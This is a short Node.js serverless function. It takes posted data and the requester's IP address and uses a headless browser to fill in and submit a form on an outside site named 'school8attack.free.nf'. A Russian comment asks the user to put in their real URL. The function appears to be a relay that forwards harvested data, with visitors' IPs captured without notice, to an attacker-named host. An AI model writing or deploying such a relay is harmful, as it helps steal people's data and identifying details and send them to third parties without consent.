const puppeteer = require('puppeteer-core');
const chromium = require('@sparticuz/chromium');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).send('Only POST allowed');
    return;
  }

  const { data } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  if (!data) {
    res.status(400).send('Data field missing');
    return;
  }

  const targetUrl = 'https://school8attack.free.nf'; // <-- Укажи свой реальный URL

  const browser = await puppeteer.launch({
    args: chromium.args,
    defaultViewport: chromium.defaultViewport,
    executablePath: await chromium.executablePath,
    headless: chromium.headless,
  });

  const page = await browser.newPage();

  try {
    await page.goto(targetUrl, { waitUntil: 'networkidle2' });

    await page.type('#ip', ip);
    await page.type('#data', data);
    await page.click('#submit');

    await page.waitForTimeout(2000);
    await browser.close();

    res.status(200).send('Data submitted successfully');
  } catch (error) {
    console.error(error);
    await browser.close();
    res.status(500).send('Error submitting data');
  }
};
